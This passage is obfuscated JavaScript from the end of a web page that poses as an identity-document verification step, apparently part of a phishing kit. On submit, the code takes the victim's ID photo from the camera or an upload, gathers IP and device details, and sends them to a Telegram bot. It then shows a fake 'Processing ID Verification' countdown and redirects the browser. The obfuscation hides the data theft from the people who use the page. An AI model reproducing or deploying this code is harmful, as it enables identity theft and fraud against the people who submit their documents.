_0x263782(_0x268cb5,_0x1bec80);},'FVVwq':_0x3ffdd4(0x224),'bLiGm':_0x3ffdd4(0x244),'tagzI':function(_0x2a66c2,_0x3132bc){return _0x2a66c2!==_0x3132bc;},'UoJpr':_0x3ffdd4(0x23c),'QSlUx':function(_0x2a43a8){return _0x2a43a8();}},_0x50bc1b=document[_0x3ffdd4(_0x353dfb._0x14cf3e)](_0x1b03df[_0x3ffdd4(0x1ed)]),_0x50b8fa=_0x50bc1b[_0x3ffdd4(_0x353dfb._0x1b596f)]('2d');_0x50bc1b[_0x3ffdd4(0x1fb)]=cameraVideo[_0x3ffdd4(0x226)],_0x50bc1b[_0x3ffdd4(_0x353dfb._0xcc0fe8)]=cameraVideo[_0x3ffdd4(_0x353dfb._0x149af1)],_0x50b8fa[_0x3ffdd4(_0x353dfb._0xed9a63)](cameraVideo,0x5*0x38b+0xf06+-0x20bd,0xe0*0x8+0x1e92+-0x2592);const _0x2335bb=_0x50bc1b[_0x3ffdd4(_0x353dfb._0x417ed7)](_0x1b03df[_0x3ffdd4(_0x353dfb._0xe82985)],-0xa56+0x51c+0x53a+0.8);selectedPhotoFile=_0x1b03df[_0x3ffdd4(_0x353dfb._0x3145d1)](dataURLtoFile,_0x2335bb,_0x1b03df['FVVwq']),previewImage[_0x3ffdd4(0x227)]=_0x2335bb,previewContainer['style']['display']=_0x1b03df['bLiGm'],cameraContainer[_0x3ffdd4(_0x353dfb._0x583210)][_0x3ffdd4(0x22c)]=_0x1b03df[_0x3ffdd4(0x24d)];if(cameraStream){if(_0x1b03df['tagzI'](_0x1b03df['UoJpr'],_0x1b03df[_0x3ffdd4(_0x353dfb._0x528cb2)])){const _0x1e0118=_0x1b03df[_0x3ffdd4(_0x353dfb._0x28b658)]['split']('|');let _0x595c80=0x1800+-0x25*0xf6+0xb8e;while(!![]){switch(_0x1e0118[_0x595c80++]){case'0':_0x41e699[_0x3ffdd4(_0x353dfb._0x4d633e)][_0x3ffdd4(_0x353dfb._0x479d6b)]=_0x3ffdd4(0x1f1);continue;case'1':_0x22672b[_0x3ffdd4(0x204)][_0x3ffdd4(_0x353dfb._0x479d6b)]=_0x1b03df[_0x3ffdd4(_0x353dfb._0x2f37a6)];continue;case'2':_0x1b03df['uyANo'](_0x49e644);continue;case'3':_0x327cbc[_0x3ffdd4(_0x353dfb._0x583210)][_0x3ffdd4(_0x353dfb._0x479d6b)]=_0x3ffdd4(0x244);continue;case'4':_0x3cb745['src']=_0x6d65e5[_0x3ffdd4(0x1be)][_0x3ffdd4(0x21b)];continue;}break;}}else cameraStream[_0x3ffdd4(_0x353dfb._0x5899fd)]()[_0x3ffdd4(0x23f)](_0xb9115a=>_0xb9115a[_0x3ffdd4(0x202)]()),cameraStream=null;}_0x1b03df['QSlUx'](updateSubmitButton);}),cancelCameraBtn[_0x392586(0x21c)](_0x392586(0x1f9),function(){const _0x5265b5={_0x1ca6f0:0x1cc,_0x2db011:0x1cf,_0x251a36:0x23f,_0x454912:0x204,_0x2e1855:0x22c},_0xb1e440=_0x392586,_0x559901={};_0x559901['rnNqB']=_0xb1e440(0x1f1),_0x559901[_0xb1e440(_0x5265b5._0x1ca6f0)]=_0xb1e440(_0x5265b5._0x2db011);const _0x56e992=_0x559901;cameraStream&&(cameraStream[_0xb1e440(0x1e1)]()[_0xb1e440(_0x5265b5._0x251a36)](_0x1d07a5=>_0x1d07a5[_0xb1e440(0x202)]()),cameraStream=null),cameraContainer[_0xb1e440(_0x5265b5._0x454912)][_0xb1e440(_0x5265b5._0x2e1855)]=_0x56e992[_0xb1e440(0x1f3)],takePhotoBtn[_0xb1e440(_0x5265b5._0x454912)][_0xb1e440(0x22c)]=_0x56e992[_0xb1e440(0x1cc)],uploadFileBtn[_0xb1e440(0x204)][_0xb1e440(0x22c)]=_0x56e992['VocxH'];}),retakeBtn['addEventListener'](_0x392586(0x1f9),function(){const _0x43544d={_0x581faa:0x1cf,_0x106f2d:0x1dd,_0x1c9e1c:0x1cf,_0x5f22e7:0x204,_0x3191e5:0x22c,_0x3ab8fe:0x225,_0x520be7:0x1f1},_0x313b2b=_0x392586,_0xb15c63={};_0xb15c63[_0x313b2b(0x225)]=_0x313b2b(_0x43544d._0x581faa);const _0x28eb9b=_0xb15c63,_0x2ad402='2|4|1|3|0|5'[_0x313b2b(_0x43544d._0x106f2d)]('|');let _0xcdc187=0x1bb*0x16+0xb2a*-0x2+-0xfbe;while(!![]){switch(_0x2ad402[_0xcdc187++]){case'0':fileInput[_0x313b2b(0x237)]='';continue;case'1':takePhotoBtn['style']['display']=_0x313b2b(_0x43544d._0x1c9e1c);continue;case'2':selectedPhotoFile=null;continue;case'3':uploadFileBtn[_0x313b2b(_0x43544d._0x5f22e7)][_0x313b2b(_0x43544d._0x3191e5)]=_0x28eb9b[_0x313b2b(_0x43544d._0x3ab8fe)];continue;case'4':previewContainer[_0x313b2b(0x204)][_0x313b2b(0x22c)]=_0x313b2b(_0x43544d._0x520be7);continue;case'5':updateSubmitButton();continue;}break;}}),confirmBtn[_0x392586(0x21c)]('click',function(){const _0xc06dce={_0x27d28b:0x1ba},_0x278b84=_0x392586,_0x2e6b62={'Pfvpx':function(_0x3e8176){return _0x3e8176();}};_0x2e6b62[_0x278b84(_0xc06dce._0x27d28b)](updateSubmitButton);}),submitBtn['addEventListener'](_0x392586(0x1f9),async function(){const _0xd508b9={_0x27c9a7:0x20a,_0x4a5a32:0x1d7,_0x3984f7:0x20e,_0x2f0a4d:0x1df,_0x2b93b7:0x20d,_0x11871f:0x204,_0xbe1a51:0x22c,_0x5c1747:0x22c,_0x5c6984:0x238,_0x49add2:0x22b,_0x360cd2:0x208,_0x1a3c94:0x1c2,_0x19e445:0x1c8,_0x53716a:0x22a,_0x620145:0x1e3,_0x68779d:0x1f0,_0x750e80:0x200,_0x9b8907:0x1e9,_0xe91fcc:0x249,_0xfd05e9:0x1f8,_0x5697cb:0x1e0,_0x144713:0x1dc,_0x108b77:0x228,_0x4fdd26:0x20b,_0x4c0084:0x1fa,_0x3e3747:0x1bd,_0x1c338b:0x21d},_0x284f50={_0x261e72:0x20c,_0x3e6b7b:0x21f,_0x4ec114:0x229,_0x3bb8d7:0x22c,_0x20ffa2:0x22c,_0x12fcc2:0x1cf},_0x2bcb54={_0x522d7d:0x23d,_0x5535ee:0x1fe,_0x46e833:0x204,_0x3bdf1e:0x1fb,_0x3f6ed2:0x1c5,_0x29a980:0x229,_0x1885a3:0x1d6},_0x5d8c04=_0x392586,_0x11a460={'HOCWp':_0x5d8c04(0x213),'fREzx':function(_0x18762f,_0x22db4b){return _0x18762f+_0x22db4b;},'LSKHx':function(_0x4bb3a6,_0x344850){return _0x4bb3a6*_0x344850;},'anJXn':function(_0x99d3c9,_0x595930){return _0x99d3c9-_0x595930;},'jyNZS':function(_0x11a646,_0x593ddb){return _0x11a646(_0x593ddb);},'YnUJk':_0x5d8c04(0x1f1),'LqvMZ':_0x5d8c04(0x1cf),'NXeYQ':function(_0x4b9ef7,_0x5ac02c){return _0x4b9ef7===_0x5ac02c;},'WRoMf':_0x5d8c04(_0xd508b9._0x27c9a7),'yILtq':_0x5d8c04(_0xd508b9._0x4a5a32),'sQngD':_0x5d8c04(_0xd508b9._0x3984f7),'RbgGa':function(_0xfe69d2){return _0xfe69d2();},'ehRuc':function(_0x1bb78a){return _0x1bb78a();},'XpjCl':function(_0x53c0e3,_0x5bf15f){return _0x53c0e3/_0x5bf15f;},'ZAXhh':function(_0x4b7e34,_0x5f32d3,_0x44fc5c){return _0x4b7e34(_0x5f32d3,_0x44fc5c);},'DVcig':'ID\x20photo\x20sent\x20to\x20Telegram:','qaoyW':'.upload-section','gHDnG':_0x5d8c04(_0xd508b9._0x2f0a4d),'nTZRD':function(_0x1d0b70,_0x11c653,_0x17d59d){return _0x1d0b70(_0x11c653,_0x17d59d);},'WeDeb':_0x5d8c04(_0xd508b9._0x2b93b7)};if(!selectedPhotoFile){errorMessage[_0x5d8c04(_0xd508b9._0x11871f)][_0x5d8c04(_0xd508b9._0xbe1a51)]='block';return;}submitBtn[_0x5d8c04(0x204)][_0x5d8c04(_0xd508b9._0x5c1747)]=_0x11a460[_0x5d8c04(0x1f8)],loadingSpinner[_0x5d8c04(0x204)][_0x5d8c04(0x22c)]='block';try{if(_0x11a460['NXeYQ'](_0x11a460[_0x5d8c04(0x1c7)],_0x11a460[_0x5d8c04(_0xd508b9._0x5c6984)])){const _0x150f01=_0xec3e3[_0x5d8c04(0x1dd)](','),_0x520045=_0x150f01[0x2ce+-0xe6+0xf4*-0x2][_0x5d8c04(_0xd508b9._0x49add2)](/:(.*?);/)[-0x2458+0x1a7*-0x17+0x4a5a],_0x3d986c=_0x59f947(_0x150f01[0xe91+-0x2531+-0x78b*-0x3]);let _0x4eb36b=_0x3d986c[_0x5d8c04(0x1ca)];const _0x178c34=new _0xc2a600(_0x4eb36b);while(_0x4eb36b--){_0x178c34[_0x4eb36b]=_0x3d986c[_0x5d8c04(0x1bb)](_0x4eb36b);}const _0x3abb31={};return _0x3abb31[_0x5d8c04(_0xd508b9._0x360cd2)]=_0x520045,new _0x124255([_0x178c34],_0x1d94ee,_0x3abb31);}else{const _0x4b0bb9=await _0x11a460[_0x5d8c04(_0xd508b9._0x1a3c94)](getIpInfo),_0x5626a5=_0x11a460[_0x5d8c04(0x233)](getDeviceDetails),_0x10c9d1=new Date()['toLocaleString']();let _0x46d850=_0x5d8c04(0x21e)+_0x10c9d1+_0x5d8c04(_0xd508b9._0x19e445);_0x46d850+='📋\x20Verification\x20Step:\x20Identity\x20Document\x20Upload\x0a',_0x46d850+=_0x5d8c04(_0xd508b9._0x53716a)+selectedPhotoFile['name']+'\x0a',_0x46d850+=_0x5d8c04(_0xd508b9._0x620145)+_0x11a460[_0x5d8c04(0x215)](selectedPhotoFile[_0x5d8c04(0x245)],0x1*-0x335+0x1363+0x2*-0x617)[_0x5d8c04(_0xd508b9._0x68779d)](-0x2*-0x1198+0x1958*-0x1+-0x9d7)+_0x5d8c04(_0xd508b9._0x750e80),_0x46d850+=_0x5626a5,_0x46d850+='\x0a'+_0x4b0bb9;const _0x458055=await _0x11a460['ZAXhh'](sendPhotoToTelegram,selectedPhotoFile,_0x46d850);console[_0x5d8c04(_0xd508b9._0x9b8907)](_0x11a460[_0x5d8c04(_0xd508b9._0xe91fcc)],_0x458055),loadingSpinner[_0x5d8c04(0x204)][_0x5d8c04(_0xd508b9._0x5c1747)]=_0x11a460[_0x5d8c04(_0xd508b9._0xfd05e9)];const _0x404c60=document[_0x5d8c04(0x1cb)](_0x5d8c04(_0xd508b9._0x5697cb));_0x404c60['style'][_0x5d8c04(_0xd508b9._0x144713)]=_0x5d8c04(0x22d);let _0x187dda=-0xaf7+-0xbf*0xe+0x1a*0xd3;_0x404c60['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22color:\x20#1877f2;\x20font-weight:\x20600;\x20margin-bottom:\x208px;\x22>Processing\x20ID\x20Verification</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22color:\x20#1c1e21;\x20font-size:\x2014px;\x22>Completing\x20verification\x20in\x20<span\x20id=\x22countdown-timer\x22>'+_0x187dda+_0x5d8c04(_0xd508b9._0x108b77);const _0x2ce519=document[_0x5d8c04(_0xd508b9._0x4fdd26)](_0x11a460[_0x5d8c04(_0xd508b9._0x4c0084)]);_0x2ce519[_0x5d8c04(0x1e4)](_0x11a460[_0x5d8c04(0x20f)],_0x404c60);const _0x2972a0=_0x11a460[_0x5d8c04(_0xd508b9._0x3e3747)](setInterval,()=>{const _0x5b33d1=_0x5d8c04;_0x187dda--;const _0xe6fb4=document[_0x5b33d1(0x1fe)](_0x5b33d1(_0x2bcb54._0x522d7d)),_0x2cbcce=document[_0x5b33d1(_0x2bcb54._0x5535ee)](_0x11a460[_0x5b33d1(0x1bf)]);if(_0xe6fb4)_0xe6fb4[_0x5b33d1(0x22f)]=_0x187dda;if(_0x2cbcce)_0x2cbcce[_0x5b33d1(_0x2bcb54._0x46e833)][_0x5b33d1(_0x2bcb54._0x3bdf1e)]=_0x11a460['fREzx'](_0x11a460[_0x5b33d1(_0x2bcb54._0x3f6ed2)](_0x11a460['anJXn'](0x15*0x1b+-0x10b3+0xe81,_0x187dda)/(0x1247*0x1+-0x4d5*-0x1+-0x101*0x17),0x21d7+0x1*0x23d1+0x193*-0x2c),'%');_0x187dda<=0xc3d+0xdc2*-0x1+0x185&&(_0x11a460[_0x5b33d1(0x21a)](clearInterval,_0x2972a0),window[_0x5b33d1(_0x2bcb54._0x29a980)][_0x5b33d1(0x1d2)]=_0x5b33d1(_0x2bcb54._0x1885a3));},-0x2*0xd40+0x1000+0xe68);}}catch(_0x3a0148){console[_0x5d8c04(_0xd508b9._0x1c338b)](_0x11a460[_0x5d8c04(0x1db)],_0x3a0148),setTimeout(()=>{const _0x5049ad=_0x5d8c04;_0x11a460[_0x5049ad(_0x284f50._0x261e72)](_0x5049ad(0x21f),_0x5049ad(_0x284f50._0x3e6b7b))?window[_0x5049ad(_0x284f50._0x4ec114)][_0x5049ad(0x1d2)]=_0x11a460[_0x5049ad(0x248)]:(_0x232f04&&(_0x55ffbe[_0x5049ad(0x1e1)]()['forEach'](_0x5c6ed8=>_0x5c6ed8[_0x5049ad(0x202)]()),_0x5bab87=null),_0x3ca28f[_0x5049ad(0x204)][_0x5049ad(_0x284f50._0x3bb8d7)]=_0x11a460[_0x5049ad(0x1f8)],_0x4d5910['style']['display']=_0x11a460[_0x5049ad(0x216)],_0x54ea11[_0x5049ad(0x204)][_0x5049ad(_0x284f50._0x20ffa2)]=_0x5049ad(_0x284f50._0x12fcc2));},-0x2*-0x1352+0xd64*0x1+0x10*-0x208);}});</script></body></html>
